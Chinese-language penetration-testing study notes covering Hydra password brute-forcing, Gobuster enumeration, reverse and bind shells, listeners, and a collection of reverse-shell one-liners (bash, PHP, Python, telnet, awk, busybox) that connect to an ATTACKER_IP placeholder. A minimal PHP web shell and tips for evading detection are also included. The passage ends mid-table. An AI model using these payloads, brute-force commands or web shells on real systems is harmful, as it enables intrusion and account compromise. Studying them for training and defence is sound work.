# 九头蛇Hydra
## 什么是 Hydra？
Hydra 是一款在线暴力破解密码的程序，也是一种高效的系统登录密码“黑客”工具。

Hydra 可以通过加载列表来“暴力破解”多种身份验证服务。想象一下，如果你想手动猜测某个服务（如 SSH、Web 应用程序表单、FTP 或 SNMP）的密码，过程会非常缓慢；而使用 Hydra，我们可以通过运行密码字典来加速这一过程，从而找出正确的密码。

根据其官方仓库的说明，Hydra 支持（即具备暴力破解能力）以下协议：

Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 和 v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC 以及 XMPP。

## hydra命令
***以目标机ip为10.144.175.180为例***

我们传递给 Hydra 的选项取决于我们所攻击的服务（协议）。例如，如果我们想以用户名 `user` 和密码列表 `passlist.txt` 暴力破解 FTP，我们会使用以下命令：

`hydra -l user -P passlist.txt ftp://10.144.175.180`

对于这台已部署的机器，以下是在 SSH 和 Web 表单（POST 方法）上使用 Hydra 的命令。

### SSH

`hydra -l <用户名> -P <密码列表完整路径> 10.144.175.180 -t 4 ssh`

| 选项 | 描述 |
| :--- | :--- |
| **-l** | 指定登录所需的（SSH）用户名 |
| **-P** | 指定密码字典列表 |
| **-t** | 设置并行运行的线程数 |

例如，命令 `hydra -l root -P passwords.txt 10.144.175.180 -t 4 ssh` 将按以下参数运行：
* Hydra 将使用 `root` 作为 **SSH** 的用户名。
* 它将尝试 `passwords.txt` 文件中的所有密码。
* 按照 `-t 4` 的指示，将有 4 个线程并行运行。

---

### Web 表单 (POST 方法)

我们也可以使用 Hydra 暴力破解 Web 表单。你必须明确其请求类型；通常使用的是 **GET** 或 **POST** 方法。你可以通过浏览器的网络选项卡（开发者工具中）查看请求类型，或直接查看源代码。

`sudo hydra <用户名> <字典> 10.144.175.180 http-post-form "<路径>:<登录凭据>:<无效响应>"`

| 选项 | 描述 |
| :--- | :--- |
| **-l** | 指定（Web 表单）登录的用户名 |
| **-P** | 指定要使用的密码列表 |
| **http-post-form** | 表单类型为 POST |
| **\<path\>** | 登录页面的 URL，例如 `login.php` |
| **\<login_credentials\>** | 用于登录的用户名和密码参数，例如 `username=^USER^&password=^PASS^` |
| **\<invalid_response\>** | 登录失败时，服务器返回响应中的部分内容 |
| **-V** | 显示每次尝试的详细输出（Verbose） |

以下是一个暴力破解 POST 登录表单的具体命令示例：

`hydra -l <用户名> -P <字典> 10.144.175.180 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

* 登录页面仅为 `/`（即主 IP 地址）。
* `username` 是输入用户名的表单字段。
* 指定的用户名将替换 **^USER^**。
* `password` 是输入密码的表单字段。
* 提供的密码将替换 **^PASS^**。
* 最后，`F=incorrect` 是登录失败时出现在服务器回包中的字符串。

### 补充说明

如果 Web 服务器监听的是非默认端口号，你可以使用 `-s <端口号>` 显式指定端口，例如：

`hydra -l <用户名> -P <字典> 10.144.175.180 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <端口号> -V`

两个 `username` 的区别在于一个是“数据源”，一个是“提交目标”：

#### 1. `-l <username>` 中的 username
* **性质**：**输入值（Input Value）**。
* **作用**：这是你**想要尝试登录的账号名称**（比如 `admin` 或 `root`）。
* **位置**：它是 Hydra 命令的参数，告诉 Hydra：“我要用这个具体的字符串去敲门”。

#### 2. `/:username` 中的 username
* **性质**：**表单字段名（Form Field Name）**。
* **作用**：这是目标网页 HTML 代码里定义的**变量名**。
* **位置**：它存在于服务器端的代码中。Hydra 必须知道网页接收账号的那个“框”叫什么名字，才能把数据准确地填进去。

#### 通俗的比喻
想象你在填一张纸质的**登录申请表**：

* **`/:username`**：相当于申请表上印着的**“姓名：_______”**这个标签。它告诉 Hydra 应该把名字写在哪个横线上。
* **`-l <username>`**：相当于你**手里拿的身份证**。它告诉 Hydra 横线上具体要写哪个名字。

#### 如果网页代码变了
如果某个网站的开发者把登录框的 HTML 代码改成了：
`<input type="text" name="login_account">`

那么你的命令也必须随之改变：
* `-l <username>` **保持不变**（因为你还是想用那个账号名）。
* 后面的部分要改成 `/:login_account=^USER^`（因为“横线”的名字变了）。

# Gobuster
Gobuster 是一款由 Golang 编写的开源攻击性安全工具。它通过使用特定的字典（Wordlists）并处理返回的响应，以暴力破解的方式枚举 Web 目录、DNS 子域名、虚拟主机（vhosts）、亚马逊 S3 存储桶以及谷歌云存储（GCS）。

通过命令`gobuster --help`可以查看相关参数。

### 常用的flag

| 短标志 | 长标志 | 功能描述 | 默认值 / 建议 |
| :--- | :--- | :--- | :--- |
| **`-t`** | **`--threads`** | 配置扫描时使用的**并发线程数**。每个线程以微小延迟发送请求。 | 默认 **10**（大型字典建议调大） |
| **`-w`** | **`--wordlist`** | 指定用于迭代爆破的**字典文件路径**。字典中的每一行都会拼接到目标 URL 后。 | **必填项** |
| | **`--delay`** | 定义请求之间的**等待时间**（如 `100ms`）。用于规避 Web 服务器的速率限制或 WAF 检测。 | 默认无延迟 |
| | **`--debug`** | 启用调试模式。当命令运行出错或出现意外行为时，用于**排查错误原因**。 | - |
| **`-o`** | **`--output`** | 将枚举出的结果**保存到指定文件中**，方便后续审计或查阅。 | - |
|**`-u`**|-|指定要扫描的URL|-|

### 运行模式

| 模式命令 | 功能名称 | 详细用途 |
| :--- | :--- | :--- |
| **`dir`** | **目录/文件枚举** | 最常用的模式。通过字典查找网站隐藏的**文件夹和文件**（如 `/admin`, `/.git`, `/config.php`）。 |
| **`dns`** | **DNS 子域名枚举** | 通过字典爆破寻找目标的**二级域名**（如 `dev.example.com`, `test.example.com`）。 |
| **`fuzz`** | **模糊测试模式** | 更加灵活。它会将字典中的词替换掉请求中标记为 `FUZZ` 的部分，可以用在 **URL、请求头 (Headers) 或请求体 (Body)** 中。 |
| **`vhost`** | **虚拟主机枚举** | 寻找同一 IP 地址下托管的不同站点。它通过修改 HTTP 请求头的 `Host` 字段来探测服务器是否响应不同的内容。 |
| **`s3`** | **AWS S3 桶枚举** | 专门用于探测亚马逊云（AWS）上配置不当、公开暴露的 **S3 存储桶**。 |
| **`gcs`** | **谷歌云存储枚举** | 与 S3 模式类似，但针对的是**谷歌云 (Google Cloud Storage)** 的存储桶。 |
| **`tftp`** | **TFTP 枚举** | 探测网络中开放的 **TFTP（简单文件传输协议）** 服务器并枚举其文件。 |
| **`completion`** | **自动补全脚本** | 并不是扫描模式，而是为你当前的 Shell（如 Bash 或 Zsh）生成**命令自动补全脚本**，提升操作效率。 |

---

### 重点模式区分：`dns` vs `vhost`
这两个模式经常被搞混，理解它们的区别对渗透测试很重要：

1.  **`dns` 模式**：是去问 **DNS 服务器**：“嘿，`dev.example.com` 这个域名存在吗？”如果存在，DNS 会返回一个 IP。这属于网络层面的探测。
2.  **`vhost` 模式**：是直接去问 **Web 服务器**（通常直接用 IP 访问）：“嘿，我想看 `dev.example.com` 的网页，你有吗？”如果服务器配置了该虚拟主机，它就会返回页面。这属于应用层面的探测。

### 示例演示

让我们来看一个具体的例子，展示如何将这些命令和标志组合起来，对 Web 目录进行枚举：

```bash
gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64
```

* **`gobuster dir`**：表示我们将使用**目录和文件枚举模式**。
* **`-u "http://www.example.thm/"`**：告诉 Gobuster 目标 URL 是 `http://example.thm/`。
* **`-w /usr/share/wordlists/dirb/small.txt`**：指示 Gobuster 使用 `small.txt` 字典文件对 Web 目录进行暴力破解。Gobuster 会将字典中的每一个条目拼接到目标 URL 后形成一个新的地址，并发送 GET 请求。

* **`-t 64`**：将 Gobuster 的线程数设置为 **64**。这会显著提升扫描性能。

## dir模式
Gobuster 拥有 dir 模式，允许用户枚举网站目录及其文件。当你进行渗透测试并希望了解网站的目录结构及其中包含的文件时，此模式非常有用。通常，网站和 Web 应用程序的目录结构遵循特定的命名习惯，这使得它们很容易受到基于字典的暴力破解攻击。



`gobuster dir --help`可以查看其帮助页面。

用于微调 `gobuster dir` 命令的常用flag：

| 短标志 | 长标志 | 描述 |
| :--- | :--- | :--- |
| **`-c`** | **`--cookies`** | 配置每个请求随附的 **Cookie**，例如会话 ID（Session ID）。 |
| **`-x`** | **`--extensions`** | 指定你想要扫描的**文件扩展名**。例如：`.php`, `.js`。 |
| **`-H`** | **`--headers`** | 配置每个请求随附的**完整请求头**（Header）。 |
| **`-k`** | **`--no-tls-validation`** | 使用 HTTPS 时**跳过证书校验过程**。在 CTF 比赛或 THM 的实验房间中，常使用自签名证书，这会导致 TLS 校验出错。 |
| **`-n`** | **`--no-status`** | 当你不希望在输出中看到每个响应的状态码时设置此标志。这有助于保持**屏幕输出整洁**。 |
| **`-P`** | **`--password`** | 与 `--username` 配合使用，以执行**身份验证请求**。当你已获得用户凭据时非常有用。 |
| **`-s`** | **`--status-codes`** | 配置你想要显示的**响应状态码**，例如 `200`，或范围如 `300-400`。 |
| **`-b`** | **`--status-codes-blacklist`** | 配置你不希望显示的**黑名单状态码**。设置此标志会覆盖 `-s` 标志。 |
| **`-U`** | **`--username`** | 与 `--password` 配合使用，以执行**身份验证请求**。 |
| **`-r`** | **`--followredirect`** | 配置 Gobuster **跟随重定向**。当收到 HTTP 重定向状态码（如 301 或 302）时，客户端将被引导至不同的 URL。 |

### 如何使用 dir 模式

要以 `dir` 模式运行 Gobuster，应使用以下命令格式：
```bash
gobuster dir -u "http://www.example.thm" -w /path/to/wordlist
```

请注意，除了 `dir` 关键字外，该命令还包含 `-u` 和 `-w` 标志。这两个标志是 Gobuster 进行目录枚举的**必选项**。让我们来看一个使用 Gobuster `dir` 模式枚举目录和文件的实际例子：

```bash
gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
```

该命令使用 `directory-list-2.3-medium.txt` 字典扫描 `www.example.thm` 上的所有目录。让我们详细分析该命令的每个部分：

* **`gobuster dir`**：配置 Gobuster 使用目录和文件枚举模式。
* **`-u http://www.example.thm`**：
    * 此 URL 将作为 Gobuster 开始搜索的**基础路径**。上方的 URL 使用的是 Web 根目录。例如，在 Linux 典型的 Apache 安装中，这对应 `/var/www/html`。如果你想枚举某个特定目录（如“resources”），则应将 URL 设置为 `http://www.example.thm/resources`。可以将其理解为 `http://www.example.thm/文件夹路径`。
    * URL **必须包含所使用的协议**（本例中为 HTTP）。这是必需的，如果协议错误，扫描将失败。
    * 在主内部部分，你可以填写 **IP 地址**或**主机名（HOSTNAME）**。需要注意的是，使用 IP 时，你可能会访问到非预期的网站，因为一个 Web 服务器可以通过一个 IP 托管多个网站（这种技术称为**虚拟主机 VHost**）。为了确保准确性，建议使用主机名。
    * **Gobuster 不会自动进行递归枚举**。也就是说，如果扫描结果显示了一个你感兴趣的子目录，你需要手动针对该特定目录再次运行扫描。
* **`-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`**：配置 Gobuster 使用该字典进行枚举。字典中的每个条目都会被追加到配置的 URL 之后。
* **`-r`**：配置 Gobuster **跟随重定向**。如果收到 301 状态码，Gobuster 将导航至响应中包含的重定向 URL。

---

#### 使用 `-x` 标志指定文件类型
```bash
gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js
```

除了进行基础的目录列表枚举外，此命令还会寻找所有后缀为 **.php** 或 **.js** 的文件。这在探测特定技术栈构建的 Web 应用时非常高效。

## dns模式
此模式允许 Gobuster 对**子域名**进行暴力破解。

同样，输入`gobuster dns --help`可以显示dns模式的全部flag。以下是一些常用的flag：

| 短标志 | 长标志 | 描述 |
| :--- | :--- | :--- |
| **`-c`** | **`--show-cname`** | 显示 **CNAME 记录**（注意：不能与 `-i` 标志同时使用）。 |
| **`-i`** | **`--show-ips`** | 包含此标志将显示域名及子域名解析到的 **IP 地址**。 |
| **`-r`** | **`--resolver`** | 配置用于解析域名的**自定义 DNS 服务器**（例如 `8.8.8.8`）。 |
| **`-d`** | **`--domain`** | 配置你想要枚举的**目标域名**。 |

```bash
gobuster dns -d example.thm -w /path/to/wordlist
```

请注意，除了 `dns` 关键字外，该命令还包含 `-d` 和 `-w` 标志。这两个标志是 Gobuster 进行子域名枚举的**必选项**。让我们来看一个使用 Gobuster `dns` 模式枚举子域名的例子：

```bash
gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

## vhost模式
我们要关注的最后一个模式是 **`vhost`** 模式。此模式允许 Gobuster 对**虚拟主机（Virtual Hosts）**进行暴力破解。

### 什么是虚拟主机？
虚拟主机是指在同一台机器（同一个 IP）上运行的多个不同网站。有时它们看起来非常像子域名，但千万不要被表象迷惑！
* **虚拟主机（Virtual Hosts）**：是基于 IP 的，它们运行在同一台服务器上。
* **子域名（Subdomains）**：是在 DNS 记录中设置的。

---

### `vhost` 模式与 `dns` 模式的区别
这两者的核心区别在于 Gobuster 的**扫描方式**：

1.  **`vhost` 模式**：
    它会直接访问 URL。它通过将你配置的主机名（使用 `-u` 标志）与字典中的条目相结合来构造 URL 并进行导航。
    * *简单来说：它在 HTTP 请求的“Host”头部里不断换名字，直接问 Web 服务器：“你这儿是不是还藏着这个网站？”*

2.  **`dns` 模式**：
    它会对 FQDN（全限定域名）进行 **DNS 查询**。它通过将你配置的域名（使用 `-d` 标志）与字典中的条目相结合来构造查询。
    * *简单来说：它不连接网站，而是去问 DNS 服务器：“这个域名对应的 IP 存在吗？”*
### 帮助信息

输入以下命令显示帮助：`gobuster vhost --help`。

`vhost` 模式提供的标志与 `dir` 模式非常相似。来看看一些常用的标志：

| 短标志 | 长标志 | 描述 |
| :--- | :--- | :--- |
| **`-u`** | **`--url`** | 指定用于爆破虚拟主机的**基础 URL**（目标域名或 IP）。 |
| | **`--append-domain`** | 将基础域名追加到字典中的每个单词后（例如：`word.example.com`）。 |
| **`-m`** | **`--method`** | 指定请求使用的 **HTTP 方法**（例如：`GET`, `POST`）。 |
| | **`--domain`** | 为字典中的每个条目追加一个域名以形成完整的域名（在未明确提供时非常有用）。 |
| | **`--exclude-length`** | 根据响应体的大小（长度）**排除结果**（用于过滤掉无效的默认响应页面）。 |
| **`-r`** | **`--follow-redirect`** | **跟随 HTTP 重定向**（当某些子域名会自动跳转到其他页面时非常有用）。 |

在 `vhost` 扫描中，有两个标志是**至关重要**的：

* **`--exclude-length` (排除长度)**：
    由于虚拟主机枚举是向同一个 IP 发送不同的 `Host` 头，如果服务器配置了一个“默认页面”，那么无论你搜什么域名，服务器可能都会返回同一个页面（比如状态码 200，长度 1500 字节）。
    * 如果不排除这个长度，你会看到几万条结果，全是无效的。
    * **用法示例**：如果你发现无效域名的响应长度都是 1500，就加上 `--exclude-length 1500`。

* **`--append-domain`**：
    通常你的字典里只有 `admin`, `test`, `dev` 这样的单词。如果你设置了 `-u http://example.com` 并开启此开关，Gobuster 才会真正去尝试 `admin.example.com`。**使用这个参数，则变为爆破子域名；不使用则是爆破IP邻居**

### 如何使用vhost模式
要以 vhost 模式运行 Gobuster，请输入以下格式命令：
```Bash
gobuster vhost -u "http://example.thm" -w /path/to/wordlist
```
具体示例：`gobuster vhost -u "http://10.145.190.167" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320`

你会发现，这个命令比基础命令语法要复杂得多。它包含了更多配置好的标志（Flags）。在现实测试中，情况往往也是如此，具体取决于待测试域名的基础设施是如何搭建的。

在我们的案例中，由于没有一个完整搭建好的 **DNS 基础设施**，这要求我们必须传入额外的标志，如 `--domain` 和 `--append-domain`。我们需要查看 Gobuster 发送的 Web 请求，以更好地理解这些标志是如何工作的。

下面是一个访问 `www.example.thm` 的基础 GET 请求：

```http
GET / HTTP/1.1
Host: www.example.thm
User-Agent: gobuster/3.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

Gobuster 会发送多个请求，每次都会更改请求中的 **`Host:`** 部分。在本例中，`Host:` 的值是 `www.example.thm`。我们可以将其分解为三个部分：

1.  **`www`**: 这是**子域名**。Gobuster 会用配置好的字典中的每个条目来填充这一部分。
2.  **`.example`**: 这是**二级域名**。你可以通过 `--domain` 标志来配置它（需要与顶级域名一起配置）。
3.  **`.thm`**: 这是**顶级域名**。你同样通过 `--domain` 标志来配置它。

---

### 命令分解与标志详解

既然我们知道了 Gobuster 是如何发送请求的，让我们分解命令并更仔细地检查每个标志：

* **`gobuster vhost`**: 指令 Gobuster 枚举虚拟主机。
* **`-u "http://10.145.190.167"`**: 将要访问的 URL 设置为目标 IP `10.145.190.167`。
* **`-w /usr/share/.../subdomains-top1million-5000.txt`**: 配置使用该字典。Gobuster 会将字典中的每个条目追加到配置的域名上。
* **`--domain example.thm`**: 将请求中 `Hostname:` 部分的顶级和二级域名设置为 `example.thm`。
* **`--append-domain`**: 将配置好的域名追加到字典的每个条目之后。用这个必须用`--domain`参数
* **`--exclude-length`**: 过滤从发送的 Web 请求中获得的响应。
    * 利用此标志，我们可以过滤掉误报。
    * 如果你在不带此标志的情况下运行命令，你会发现得到大量误报，例如：`Found: Orion.example.thm Status: 404 [Size: 279]`。
    * 这些误报通常具有**相似的响应大小**，因此我们可以利用这一点过滤掉大部分无效信息。

# Shell概述
shell 是一种允许用户与命令行交互的软件。它可以是图形界面，但通常是命令行界面，这取决于目标系统上运行的操作系统。
## 反向 Shell（Reverse Shell）

反向 Shell（有时被称为“connect back shell”）是网络攻击中获取系统访问权限最流行的技术之一。它的核心特征是：**连接由目标系统（受害者）发起，指向攻击者的机器**。这种方式能有效绕过防火墙的入站规则检测。

---

### 1. 反向 Shell 的工作原理

#### 第一步：设置 Netcat 监听器
攻击者必须先在自己的机器上准备好“接听电话”。我们使用 **Netcat (nc)** 工具，它支持多操作系统，可以跨网络读写数据。

**执行命令：**
`nc -lvnp 443`

* **`-l`**：进入监听模式（Listen），等待连接。
* **`-v`**：详细模式（Verbose），输出更多调试信息。
* **`-n`**：不进行 DNS 解析，直接使用 IP 地址，速度更快。
* **`-p`**：指定监听的端口（本例为 443）。

> **💡 技巧**：攻击者通常选择 **53 (DNS)**、**80 (HTTP)** 或 **443 (HTTPS)** 等常用端口。这样做是为了让恶意流量混入正常的网络流量中，从而躲避安全设备的监控。

#### 第二步：获取反向 Shell 访问权限（Payload）
监听器准备好后，攻击者需要在目标机上执行一段代码，即 **Payload（有效载荷）**。这段代码会利用系统漏洞将 Shell “暴露”到网络上。

**示例：管道反向 Shell (Named Pipe Reverse Shell)**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Payload 详细解析：**
* **`rm -f /tmp/f`**：删除可能存在的旧命名管道文件，避免冲突。
* **`mkfifo /tmp/f`**：创建一个命名管道（FIFO），用于进程间的双向通信。
* **`cat /tmp/f`**：从管道中读取数据，等待输入。
* **`| sh -i 2>&1`**：将读取的内容传给 Shell 解释器。`-i` 表示交互式，`2>&1` 将错误信息也发给攻击者。
* **`| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`**：使用 Netcat 将结果发回攻击者的 IP 和端口，并将接收到的命令写回管道。

#### 第三步：攻击者接收 Shell
一旦 Payload 执行成功，攻击者的终端（之前运行 `nc` 的地方）就会变成目标系统的命令行界面。此时，攻击者可以像在本地操作一样执行任何授权范围内的命令。

## 正向 Shell（Bind Shell）

顾名思义，**正向 Shell（Bind Shell）** 会在被攻陷的系统中“绑定”一个端口并开启监听。当连接发生时，它会将 Shell 会话暴露出来，使攻击者能够远程执行命令。

这种方法通常用于**目标机不允许外连**的情况。但它不如反向 Shell 流行，因为它需要目标机持续开启一个监听端口，这非常容易被安全设备发现。

---

### 1. 正向 Shell 的工作原理

#### 第一步：在目标机上设置监听（Payload）
攻击者需要诱导或强迫目标机执行一段代码，让它像服务器一样“开门迎客”。

**执行命令：**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Payload 详细解析：**
* **`rm -f /tmp/f`**：删除已有的命名管道文件，确保环境干净。
* **`mkfifo /tmp/f`**：创建一个命名管道（FIFO），用于进程间双向通信。
* **`cat /tmp/f`**：读取管道数据，等待攻击者的输入。
* **`| bash -i 2>&1`**：将输入传给交互式 Bash。`2>&1` 确保错误信息也能传回给攻击者。
* **`| nc -l 0.0.0.0 8080`**：**核心差异点**。使用 Netcat 在所有网卡（0.0.0.0）的 **8080 端口**开启监听。
* **`>/tmp/f`**：将 Shell 的输出结果重定向回管道，发送给连接上来的攻击者。

> **⚠️ 权限注意**：如果选择使用 **1024 以下**的端口（如 80, 443），Netcat 通常需要 **Root 权限**才能运行。使用 8080 端口可以绕过这个限制。

#### 第二步：攻击者主动连接
现在目标机已经在 8080 端口“坐等”了，攻击者从自己的机器发起连接：

**执行命令：**
```bash
nc -nv TARGET_IP 8080
```

* **`nc`**：调用 Netcat 建立连接。
* **`-n`**：禁用 DNS 解析，加快连接速度。
* **`-v`**：详细模式，连接成功时会显示提示信息。
* **`TARGET_IP`**：目标机器的实际 IP 地址。
* **`8080`**：目标机正在监听的端口号。

---

### 2. 核心对比：Reverse vs Bind

| 特性 | 反向 Shell (Reverse) | 正向 Shell (Bind) |
| :--- | :--- | :--- |
| **连接发起方** | **目标机** 发起连接 | **攻击者** 发起连接 |
| **监听方** | 攻击者机器监听 | 目标机监听 |
| **适用场景** | 目标机允许访问外网 | 目标机防火墙允许入站连接 |
| **隐蔽性** | 较高（流量像正常上网） | 较低（多了一个奇怪的监听端口） |
| **常用命令** | `nc -lvnp [Port]` | `nc [Target_IP] [Port]` |

## Shell监听器
正如我们之前所学，反向 Shell 会从受害目标连接到攻击者的机器。虽然 Netcat (nc) 是处理这类连接的常用工具，但它并非唯一的选择。

下面是一些可以作为**监听器**来与传入 Shell 进行交互的其他工具：

---

### 1. Rlwrap
**Rlwrap** 是一个利用 GNU readline 库的小巧工具。它最大的作用是为那些原本不支持编辑功能的命令提供**键盘编辑**和**命令历史**功能。

* **用法示例（配合 Netcat 使用）：**
    `rlwrap nc -lvnp 443`
* **核心优势**：
    普通的 Netcat Shell 往往非常简陋，无法使用**方向键**移动光标，也无法按“上箭头”查看历史命令。通过在前面加上 `rlwrap`，你可以像在普通终端里一样流畅地编辑命令。

---

### 2. Ncat
**Ncat** 是由 NMAP 项目发布的一个改进版 Netcat。它不仅继承了 nc 的功能，还提供了许多额外特性，最重要的就是**加密（SSL）**。

* **普通监听模式：**
    `ncat -lvnp 4444`
* **SSL 加密监听模式：**
    `ncat --ssl -lvnp 4444`
* **核心优势**：
    使用 `--ssl` 标志，Ncat 会为连接生成临时的 2048 位 RSA 密钥。这种加密方式可以让反向 Shell 的通信内容不再是“明文”，从而有效地**避开 IDS（入侵检测系统）**对特定敏感词（如 `whoami`, `cat /etc/shadow`）的流量扫描。

---

### 3. Socat
**Socat** 是一个功能极其强大的工具，它可以在两个数据源之间建立套接字（Socket）连接。在渗透测试中，它常被用于建立比 Netcat 更稳定、功能更全的双向通道。

* **用法示例：**
    `socat -d -d TCP-LISTEN:443 STDOUT`
* **参数解析：**
    * **`-d -d`**：开启详细输出（Verbose）。使用两次会进一步增加信息的详尽程度，方便调试连接问题。
    * **`TCP-LISTEN:443`**：在本地 443 端口创建一个 TCP 监听器。
    * **`STDOUT`**：将接收到的所有数据重定向到当前终端的标准输出。

---

### 🛠️ 监听器工具对比表

| 工具 | 优势 | 推荐场景 |
| :--- | :--- | :--- |
| **Netcat (nc)** | 几乎所有 Linux 系统自带，极其轻量。 | 快速测试、基础连接。 |
| **Rlwrap** | 赋予 Shell 方向键和命令历史。 | 当你需要长时间操作 Shell 且不想被无法翻页折磨时。 |
| **Ncat** | 支持 SSL 加密，功能比 nc 更稳健。 | 需要绕过流量层面的深度包检测（DPI）时。 |
| **Socat** | 极其强大，支持双向流量转发、文件传输等。 | 需要高度定制化连接或转发流量（Pivoting）时。 |

## Shell Payload
Shell Payload（有效载荷）是一段指令或脚本。在**正向 Shell** 中，它将 Shell 绑定到本地端口等待连接；在**反向 Shell** 中，它主动将 Shell 推送给攻击者的监听器。

以下是 Linux 系统中最常用的反向 Shell Payloads，按编程语言和工具分类整理：

---

### 1. Bash 系列
Bash 是 Linux 默认的 Shell，利用其内置的 `/dev/tcp` 设备可以实现极其精简的反向连接。

* **常规 Bash 反向 Shell**
    `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1`
    * **解析**：启动交互式 Bash，通过 TCP 连接将标准输出（1）和标准错误（2）重定向到攻击者，并将标准输入（0）重定向到该连接。
* **Read Line 循环模式**
    `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done`
    * **解析**：创建一个新的文件描述符（5）连接到套接字。通过循环读取指令并执行，将结果发回。
* **利用文件描述符（196 或 5）**
    `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`
    * **解析**：使用特定的文件描述符（如 196）建立 TCP 连接。这种方式在某些特定的受限环境或脚本中更为稳定。

---

### 2. PHP 系列
常用于 Web 漏洞利用（如文件上传或 RCE）。

| 函数 | 命令示例（ATTACKER_IP 需替换） |
| :--- | :--- |
| **`exec`** | `php -r '$sock=fsockopen("IP",443);exec("sh <&3 >&3 2>&3");'` |
| **`shell_exec`** | `php -r '$sock=fsockopen("IP",443);shell_exec("sh <&3 >&3 2>&3");'` |
| **`system`** | `php -r '$sock=fsockopen("IP",443);system("sh <&3 >&3 2>&3");'` |
| **`passthru`** | `php -r '$sock=fsockopen("IP",443);passthru("sh <&3 >&3 2>&3");'` |
| **`popen`** | `php -r '$sock=fsockopen("IP",443);popen("sh <&3 >&3 2>&3", "r");'` |

* **核心原理**：通过 `fsockopen` 打开网络套接字（通常占用文件描述符 3），然后利用不同的系统调用函数将 Shell 的输入输出绑定到该套接字上。

---

### 3. Python 系列
Python Payload 的优势在于它可以调用 `pty` 库来生成一个更接近真实终端的 Shell。

* **环境变量导出法**
    `export RHOST="IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`
* **subprocess 模块法**
    `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
* **极简短代码**
    `python -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`

---

### 4. 其他工具系列

#### **Telnet**
`TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF`
* **原理**：利用命名管道（FIFO）和 Telnet 实现双向通信。当目标机没有安装 Netcat 时，这是一个极佳的备选方案。

#### **AWK**
`awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
* **原理**：利用 AWK 内置的 TCP 功能。这种方式非常隐蔽，因为很少有管理员会怀疑 `awk` 进程。

#### **BusyBox**
`busybox nc ATTACKER_IP 443 -e sh`
* **原理**：BusyBox 常用于嵌入式系统或轻量级容器（如 Alpine）。它自带的 `nc` 版本通常支持 `-e` 参数（直接执行），使用起来非常简单。

## Web Shell

**Web Shell** 是一种利用受害者 Web 服务器支持的脚本语言编写的恶意脚本。它通过 Web 服务器本身来执行系统命令。Web Shell 通常表现为一个简单的脚本文件，隐藏在受感染的 Web 应用程序或服务中。由于其通信流量通常混杂在正常的 HTTP 流量中，因此极难被检测，深受攻击者青睐。

Web Shell 可以使用多种语言编写，如 **PHP、ASP、JSP** 甚至简单的 **CGI 脚本**。

---

### 1. PHP Web Shell 实例分析

让我们通过一个简单的 PHP 脚本来看看 Web Shell 的工作原理：

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

#### **部署与利用流程：**
1.  **保存文件**：将上述代码保存为 `shell.php`。
2.  **上传/植入**：攻击者利用 **文件上传漏洞 (File Upload)**、**文件包含漏洞 (LFI/RFI)** 或 **命令注入** 等手段，将此文件上传到 Web 服务器。
3.  **远程访问**：部署成功后，通过 URL 访问该脚本。
4.  **执行命令**：根据代码逻辑，攻击者通过 URL 参数 `cmd` 传递想要执行的指令。

**示例：**
若要执行 `whoami` 命令，攻击者只需访问：
`http://victim.com/uploads/shell.php?cmd=whoami`
网页浏览器会直接显示该命令的执行结果（例如：`www-data`）。

---

### 2. 现成的高级 Web Shell 工具

由于现代 Web 服务器功能强大，Web Shell 已经演变成功能极其丰富的“后门平台”，不仅能执行命令，还能规避检测。

| 工具名称 | 特点描述 |
| :--- | :--- |
